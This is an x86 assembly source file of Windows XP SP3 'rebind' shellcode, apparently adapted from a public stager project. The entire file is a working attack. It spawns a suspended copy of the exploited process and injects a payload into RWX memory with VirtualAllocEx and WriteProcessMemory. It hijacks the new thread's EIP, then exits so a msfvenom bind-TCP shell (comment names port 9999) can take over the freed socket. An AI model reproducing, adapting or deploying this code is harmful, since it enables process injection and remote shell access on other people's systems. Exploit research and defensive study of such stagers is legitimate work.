;
; Rebind shellcode 
; Addresses are hardcoded for Windows XP SP3
;
; Code modified from: https://github.com/BorjaMerino/Windows-One-Way-Stagers/blob/master/Rebind-Socket/migrate_rebind_socket.asm
;

global _start			

section .text
_start:

  mov eax, [fs:0x30]        ; PEB
  mov eax, [ds:eax+0x10]    ; _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;
  mov esi, [ds:eax+0x74]    ; Path Binary
  add esp,-400              ; adjust the stack to avoid corruption
  lea edx,[esp+0x60]
  push edx
  mov ecx, 0x7c801ef2       ; WinXP SP3 ( "kernel32.dll", "GetStartupInfoA" )
  call ecx                  ; GetStartupInfoA( &si );
  lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax
  mov [eax+0x4], ecx        ; Clean lpReserved (change me)
  mov [eax+0x8], ecx        ; Clean lpDesktop (change me)
  mov [eax+0xC], ecx        ; Clean lpTitle (change me)
  lea edi,[eax+0x60]        ; Offset of empty space for lpProcessInformation
  push edi                  ; lpProcessInformation : write processinfo here
  push eax                  ; lpStartupInfo : current info (read)
  xor ebx,ebx
  push ebx                  ; lpCurrentDirectory
  push ebx                  ; lpEnvironment
  push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
  push ebx                  ; bInHeritHandles
  push ebx                  ; lpThreadAttributes
  push ebx                  ; lpProcessAttributes
  push esi                  ; lpCommandLine
  push ebx                  ; lpApplicationName
  mov ecx, 0x7c802336       ; WinXP SP3 ( "kernel32.dll", "CreateProcessW" )
  call ecx                  ; CreateProcessW( &si );

  ; if we didn't get a new process, use this one
  test eax,eax
  jz payload                ; If process creation failed, jump to shellcode

  push 0x40                 ; RWX
  add bh, 0x10              ; ebx = 0x1000
  push ebx                  ; MEM_COMMIT
  mov ebx, 0x253            ; Bufer size
  push ebx                  
  xor ebx,ebx
  push ebx                  ; address
  push dword [edi]          ; handle
  mov ecx, 0x7c809b02       ; WinXP SP3 ( "kernel32.dll", "VirtualAllocEx" )
  call ecx                  ; VirtualAllocEx( ...);
  ; eax now contains the destination

  push esp                  ; lpNumberOfBytesWritten
  push 0x253                ; nSize                                  

  ; pick up pointer to shellcode & keep it on stack
  jmp begin_of_payload

  begin_of_payload_return:  ; lpBuffer
  push eax                  ; lpBaseAddress
  XCHG eax, esi             ; record base address
  push dword [edi]          ; hProcess
  mov ecx, 0x7c802213       ; WinXP SP3 ( "kernel32.dll", "WriteProcessMemory" )
  call ecx                  ; WriteProcessMemory( ...)

  ; Let's Thread Hijack
  mov ebx, dword [edi+0x4]
  push 0x10001
  push esp                  ; lpContext
  push ebx                  ; hThread
  mov ecx, 0x7c839725       ; WinXP SP3 ( "kernel32.dll", "GetThreadContext" ) 
  call ecx                  ; GetThreadContext( ...);

  xor ecx, ecx
  mov ecx, 0xb8
  mov dword [esp+ecx], esi ; Change EIP Context 
;  mov dword [esp+0xB8], esi ; Change EIP Context 
  push esp                  ; lpContext
  push ebx                  ; hThread
  mov ecx, 0x7c863aa9       ; WinXP SP3( "kernel32.dll", "SetThreadContext" ) 
  call ecx

  push ebx                  ; hThread
  mov ecx, 0x7c83290f       ; WinXP SP3( "kernel32.dll", "ResumeThread" ) 
  call ecx

  ; End the current process to release socket
  push 0 					
  mov ecx, 0x7c81cafa        ; WinXP SP3 ( "kernel32.dll", "ExitProcess(0)")
  call ecx

begin_of_payload:
  call begin_of_payload_return

payload: 
; msfvenom -p windows/shell/bind_tcp LPORT=9999 -f hex
